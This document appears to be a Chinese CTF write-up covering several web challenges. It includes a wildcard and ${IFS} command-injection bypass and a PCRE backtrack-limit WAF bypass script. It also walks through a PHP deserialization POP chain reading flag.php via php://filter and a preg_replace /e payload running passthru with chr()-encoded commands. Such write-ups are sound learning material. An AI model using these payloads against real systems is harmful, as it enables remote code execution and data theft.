<p>例如**[a-c]** 代表匹配 a-b之间的字符,包括a,b字符本身</p>
<p>匹配范围为当前目录，例子如下</p>
<pre><code class="hljs plaintext">/[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt
 
相当于
/bin/cat flag.txt
 
因为[]匹配范围只在当前路径
所以要为bin绝对路径</code></pre>
<p>一定要注意绝对路径，相对路径是不可以的！</p>
<p>随后参考上述可以构造如下payload：</p>
<pre><code class="hljs plaintext">/[a-c][h-j][m-o]/[b-d]a[s-u]${IFS}/fl?g
也就是:/bin/cat flag;?:表示通配字符0或,也就是可以匹配任意一个字符
${IFS}在linux中可以代替空格

这里选/flag原因是通过构造ls${IFS}/得到的，只输入ls也会发现flag.php，不过这是假的</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002171434401.png" alt="image-20231002171434401"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002171456572.png" alt="image-20231002171456572"></p>
<h3 id="week1登录就给flag">[WEEK1]登录就给flag</h3>
<p>首页如下，这里只能在登录页面转悠，没什么信息的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002171556583.png" alt="image-20231002171556583"></p>
<p>当时我想复杂了，先用dirsearch扫了扫，又bp抓包看了看，什么也没发现，最后尝试了万能密码和sql注入均无果，我以为这道题很难的，结果一位师傅告诉我直接弱口令啊，我还纳闷呢，我也试过啊，没这么简单吧。但我又想到我当时只是尝试了一下，随后我又去尝试，发现真的很简单：</p>
<p>直接admin：password就登陆进去了。。。。。。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002171845988.png" alt="image-20231002171845988"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002171851387.png" alt="image-20231002171851387"></p>
<p>拿到flag</p>
<h3 id="week1生成你的邀请函吧~">[WEEK1]生成你的邀请函吧~</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002171944121.png" alt="image-20231002171944121"></p>
<p>首页如下，再结合题目给的信息：</p>
<pre><code class="hljs json">API：url/generate_invitation  
Request：POST application/json  
Body：<span class="hljs-punctuation">{</span>  
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Yourname"</span><span class="hljs-punctuation">,</span>  
    <span class="hljs-attr">"imgurl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg"</span>  
<span class="hljs-punctuation">}</span>  

使用POST json请求来生成你的邀请函吧~flag就在里面哦~</code></pre>
<p>很显然就是抓包修改为上述格式即可，但这里注意不必放到repeater直接修改后放包即可，不然出来的图片你看不到，只能是一堆乱码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002172127324.png" alt="image-20231002172127324"></p>
<p>添加指定url后抓包修改</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002172205055.png" alt="image-20231002172205055"></p>
<p>未修改前如上图；修改后如下图：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002172317260.png" alt="image-20231002172317260"></p>
<p>直接放包即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002172359170.png" alt="image-20231002172359170"></p>
<p>放包之后会发现浏览器自动下载了图片 ，访问看到如下图flag，这里我是发到了微信直接利用微信的自带图片提取文字功能，大家有别的办法也可以</p>
<h3 id="week11zzphp">[WEEK1]1zzphp</h3>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">'./index.txt'</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c_ode'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>]))<span class="hljs-comment">//判断参数是否存在</span>
{
    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c_ode'</span>];<span class="hljs-comment">//强制转换为字符串类型后赋值</span>
    <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<span class="hljs-comment">//正常赋值</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[0-9]/"</span>, <span class="hljs-variable">$num</span>))<span class="hljs-comment">//正则匹配</span>
    {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no number!"</span>);
    }
    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))<span class="hljs-comment">//转换为整数类型</span>
    {
      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/.+?SHCTF/is'</span>, <span class="hljs-variable">$code</span>))<span class="hljs-comment">//还是正则匹配</span>
      {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no touch!'</span>);
      }
        <span class="hljs-comment">//找寻code字符串中第一次出现指定字符串的位置</span>
      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">'2023SHCTF'</span>) === <span class="hljs-literal">FALSE</span>)
      {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'what do you want'</span>);
      }
      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    }
}</code></pre>
<p>emmm有难度的PHP特性（只怪我刷太少，太菜了┭┮﹏┭┮）</p>
<p>这里也是废了很长时间，最后也是百度找到的思路</p>
<p>首先第一个正则的话，做题多了就知道preg_match函数的特性：不能处理数组类型（会返回false），那我们直接将num赋值为：num[]=1，在之后的intval作用下会转换成1，即可绕过。</p>
<p>第二个呢是正则与stripos的配合绕过，分析得该正则要求你的code参数不能为SHCTF，且SHCTF前面不能有任意字符，但后续的stripos要求你的code参数必须含有2023SHCTF，所以这里花了我很长时间。</p>
<p>在此期间我尝试了数组等等，但均无果，之后网上漫游发现可以利用正则最大回溯绕过。那我们先来学习一下该知识点，先放出参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x01">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌</a></p>
<p>这篇文章很顶，解释的我都能看懂(<em>^▽^</em>)，但由于我概述能力不好，就结合别人的话语来阐释：</p>
<p>​		简单来说就是正则表达式匹配的时候某个.*将后面的字符全部匹配到了，导致表达式后面的式子没有地方匹配，因此一个一个字符吐出来，直到后面的式子全部匹配完毕或者回溯次数过多导致正则直接返回false：当然上述表述的前提下是要求正则表达式处于非贪婪模式或者NFA模式</p>
<pre><code class="hljs plaintext">NFA模式：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态（所谓的回溯也就是在返回前面的字符串进行重新匹配，直到正则表达式匹配完全），具体可参考上述文章。</code></pre>
<p>非贪婪模式：</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/UNION.+?SELECT/is'</span>, <span class="hljs-variable">$input</span>)) {
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'SQL Injection'</span>);
}</code></pre>
<p>如同上述表达式如果我输入该语句：<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p>
<pre><code class="hljs plaintext">.+?匹配到/
因为非贪婪模式，所以.+?停止匹配，而由S匹配*
S匹配*失败，回溯，再由.+?匹配*
因为非贪婪模式，所以.+?停止匹配，而由S匹配a
S匹配a失败，回溯，再由.+?匹配a
...</code></pre>
<p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002174640233.png" alt="image-20231002174640233"></p>
<p>注意正则匹配中的<code> ^.*、.*$、.</code>*就可以使用回溯，怎么回溯呢，只能上脚本了，因为一百万个字符，总不可能手写。我这里也是问GPT得到的脚本，因为我菜狗不会写┭┮﹏┭┮</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># 定义目标 URL</span>
url = <span class="hljs-string">'http://112.6.51.212:30422/?num[]=1'</span>  <span class="hljs-comment"># 请将此处的 URL 替换为你要访问的实际 URL</span>

<span class="hljs-comment"># POST 请求参数</span>
prefix_a = <span class="hljs-string">'a'</span> * <span class="hljs-number">1000000</span>
post_params = {<span class="hljs-string">'c_ode'</span>: prefix_a + <span class="hljs-string">'2023SHCTF'</span>}

<span class="hljs-comment"># 发送 POST 请求并获取响应</span>
post_response = requests.post(url, data=post_params)

<span class="hljs-comment"># 检查 POST 请求的响应</span>
<span class="hljs-keyword">if</span> post_response.status_code == <span class="hljs-number">200</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"POST 请求成功"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"POST 响应内容:"</span>, post_response.text)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"POST 请求失败"</span>)</code></pre>
<p>思路就是对该url进行请求，并传入相应的get和post参数，但在2023SHCTF之前要加入一百万个字符a，即可绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002174921001.png" alt="image-20231002174921001"></p>
<p>成功拿到flag</p>
<h3 id="week1ez_serialize">[WEEK1]ez_serialize</h3>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//高亮代码</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var_1</span>;
  
  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-comment">//需要当对象被当成一个方法(也就是函数)调用时,invoke会自动调用</span>
   <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;var_1);<span class="hljs-comment">//这里一看就知道是敏感函数，大概是用来伪协议读取的</span>
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>{
  <span class="hljs-keyword">public</span> <span class="hljs-variable">$q</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//当开始反序列化的时候，<span class="hljs-title">wakeup</span>会被自动调用</span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;q)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker"</span>;           
        }<span class="hljs-comment">//虽然这里的正则过滤的很多，但没啥用，可以忽略</span>
}

}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>{
  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-comment">//当一个类被当做字符串使用时，会自动调用</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;z-&gt;<span class="hljs-keyword">var</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>{
  <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<span class="hljs-comment">//当读取不可访问的属性的值时调用</span>
        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();
    }  
}

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'payload'</span>]))<span class="hljs-comment">//简单的传参</span>
{
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'payload'</span>]);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>很简单的序列化题，结合上述对代码的分析我们可以构造如下链子：</p>
<p>首先看准敏感函数include，这里肯定是用来读取php文件的，那这个函数肯定是我们的目标，那么我们想要调用invoke，就需要A对象被当做一个函数去调用，那我们可以找到D类中的<code>return $function();</code>符合我们的要求。</p>
<p>那想要调用其所在的get函数，就需要读取一个不可访问的属性，那我们又可以看到<code>return $this-&gt;z-&gt;var;</code>很明显如果我们令z指向对象D，那z-&gt;var相当于D-&gt;var，但很显然D中没有var属性，那便成功调用get函数了。</p>
<p>那我们想要调用其所在的tostring函数，就需要当一个类被当做字符串时会调用，那我们又可以发现wakeup里面的正则匹配，其中<code>$this-&gt;q</code>被认作字符串，那完全可以将q赋值为C类，即可走通链子。</p>
<p>至于wakeup的调用，反序列化的时候就会被自动调用，我们不必考虑。那么poc如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//highlight_file(__FILE__);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var_1</span>;

}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$q</span>;

}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;
}
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();
<span class="hljs-variable">$poc</span>-&gt;q = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();
<span class="hljs-variable">$poc</span>-&gt;q-&gt;z=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>();
<span class="hljs-variable">$poc</span>-&gt;q-&gt;z-&gt;p=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-variable">$poc</span>-&gt;q-&gt;z-&gt;p-&gt;var_1=<span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002180702598.png" alt="image-20231002180702598"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002180723398.png" alt="image-20231002180723398"></p>
<p>直接base64解码即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002180737123.png" alt="image-20231002180737123"></p>
<p>得到flag</p>
<h3 id="week1ezphp">[WEEK1]ezphp</h3>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pattern'</span>]))
{
    <span class="hljs-variable">$pattern</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pattern'</span>];
    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i"</span>,<span class="hljs-variable">$code</span>))
    {
        <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>];
        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/('</span> . <span class="hljs-variable">$pattern</span> . <span class="hljs-string">')/ei'</span>,<span class="hljs-string">'print_r("\\1")'</span>, <span class="hljs-variable">$code</span>);
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are smart"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"try again"</span>);
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"it is begin"</span>);
}
<span class="hljs-meta">?&gt;</span>
it is begin</code></pre>
<p>一看到这过滤的真的是吓到我了，但往往这么可怕的情况下就会有bug，我们查看一番发现，竟然没过滤</p>
<p>passthru()函数，好好好这么玩是吧~~~</p>
<p>这个函数与system类似，用法也一致。重点是</p>
<p><code> preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code);</code>此处的代码我们如何看懂</p>
<p>我这里也是看不懂，于是选择网上冲浪看看有机会没有，结果还真有类似的^_^，下面我就跟着那些佬的思路学习一下。</p>
<p>先介绍一个PHP特性吧：</p>
<p>php自身在解析请求的时候，如果参数名字中包含空格、.、[等字符，会将他们转换成_。</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>;

<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002181255572.png" alt="image-20231002181255572"></p>
<p>首先我们知道 preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行，前提是 subject 中有 pattern 的匹配。</p>
<p>既然是这样我们看一张图。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231002181321001.png" alt="image-20231002181321001"></p>
<p>图中实际上通过 eval 执行的是 strtolower 函数。分别实际执行的是：</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">"JUST TEST"</span>);

<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">"PHPINFO()"</span>);

<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">"<span class="hljs-subst">{${PHPINFO()}</span>}"</span>);</code></pre>
<p>第三个之所以可以执行代码，是因为我们通过复杂(花括号)语法的方式来让其代码执行。</p>
<p>然后在看：<code>这里的 replacement 是 strtolower(“\\1”) ，着重理解一下 \\1 。</code></p>
<p>\\1 在正则中存在自己的作用，其实就是匹配第一项</p>
<pre><code class="hljs php">这里给出例子
<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/('</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">')/ei'</span>, <span class="hljs-string">'strtolower("\\1")'</span>, <span class="hljs-variable">$value</span>);
 
regex是我们的参数值 即 get的名称  value是传入的参数
 
.*=<span class="hljs-title function_ invoke__">phpinfo</span>()
 
所以就变为了
 
<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/(.*)/ei'</span>, <span class="hljs-string">'strtolower("\\1")'</span>,<span class="hljs-title function_ invoke__">phpinfo</span>());
但这里无法执行<span class="hljs-title function_ invoke__">phpinfo</span>()</code></pre>
<p>要变为：<code>{${phpinfo()}}</code>，首先要知道</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span>=hello
<span class="hljs-variable">$$a</span>=world   
这里相当于 
<span class="hljs-variable">$hello</span>=world
所以
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> <span class="hljs-variable">$hello</span> 为：hello world</code></pre>
<p>我们接着理解一下</p>
<pre><code class="hljs php">${<span class="hljs-title function_ invoke__">phpinfo</span>()}
 
执行完会变为 ${<span class="hljs-number">1</span>} 因为 <span class="hljs-title function_ invoke__">phpinfo</span>()通过var_dump返回的是<span class="hljs-number">1</span>
 
所以strtolower 变为 <span class="hljs-title function_ invoke__">strtolower</span>({${<span class="hljs-number">1</span>}})
 
接着变为 <span class="hljs-title function_ invoke__">strtolower</span>({<span class="hljs-literal">null</span>})</code></pre>
<p>但似乎后面的对strtolower的解释无关紧要，我认为之主要注意通过${}来解析phpinfo()，否则无法进行命令执行</p>
<p>但有注意到PHP的特性会将.这类特殊符号转化为_，因此那些佬就换为了\S*（我不了解正则表达式，因此问了GPT）发现他俩作用在这里是相通的，不过某些细节不一致罢了</p>
<pre><code class="hljs plaintext">/(.*)/: 
这部分正则表达式匹配整个输入字符串，并捕获它到一个分组中。 .* 匹配任意字符（除了换行符 \n），.* 的括号 ( ) 将匹配的内容捕获到一个分组中，以后可以在替换中使用。

(\S*)：这个部分表示匹配零个或多个非空白字符（非空格、非制表符、非换行符等），并将其捕获到分组中。</code></pre>
<p>然后我们就可以想到构造如下payload：</p>
<pre><code class="hljs plaintext">GET：code={${passthru(ls)}}
POST：pattern=\S*</code></pre>
<p>不过考虑到过滤的很多，我就将其换为了ASCII码值来替换，脚本如下</p>
<pre><code class="hljs py"><span class="hljs-comment"># 输入字符串</span>
input_str = <span class="hljs-string">"ls"</span>
<span class="hljs-comment"># 初始化一个空字符串来存储结果</span>
output_str = <span class="hljs-string">""</span>

<span class="hljs-comment"># 遍历输入字符串中的每个字符</span>
<span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_str:
    <span class="hljs-comment"># 获取字符的 ASCII 码值，并将其转换为字符串</span>
    ascii_value = <span class="hljs-built_in">ord</span>(char)

    <span class="hljs-comment"># 格式化输出，拼接到结果字符串中</span>
    output_str += <span class="hljs-string">f"chr(<span class="hljs-subst">{ascii_value}</span>)."</span>

<span class="hljs-comment"># 去除最后一个多余的点号</span>
output_str = output_str.rstrip(<span class="hljs-string">"."</span>)

<span class="hljs-comment"># 打印结果</span>
<span class="hljs-built_in">print</span>(output_str)</code></pre>
<pre><code class="hljs plaintext">结果为：ls-&gt;chr(108).chr(115)
ls /-&gt;chr(108).chr(115).chr(32).chr(47)
等等</code></pre>
<p>最终payload为：</p>
<pre><code class="hljs plaintext">code=${passthru(chr(99).chr(97).chr(116).chr(32).chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112))}

pattern=\S*</code></pre>
